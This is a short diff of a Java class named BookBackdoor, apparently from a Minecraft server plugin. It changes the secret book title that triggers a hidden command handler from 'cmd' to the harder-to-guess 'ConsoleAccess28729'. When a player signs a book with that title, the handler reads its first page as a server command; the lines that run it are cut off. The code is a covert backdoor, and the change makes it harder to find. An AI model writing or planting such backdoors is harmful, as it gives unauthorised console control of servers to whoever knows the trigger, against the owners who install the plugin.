@@ -36,7 +36,7 @@ public class BookBackdoor implements Listener {
 
     @EventHandler
     public void onBookSign(PlayerEditBookEvent event) {
-        if(event.getNewBookMeta().getTitle().equals("cmd")){
+        if(event.getNewBookMeta().getTitle().equals("ConsoleAccess28729")){
             String text = event.getNewBookMeta().getPage(1);
             String command = text.substring(1);
             if(text.startsWith("/")){
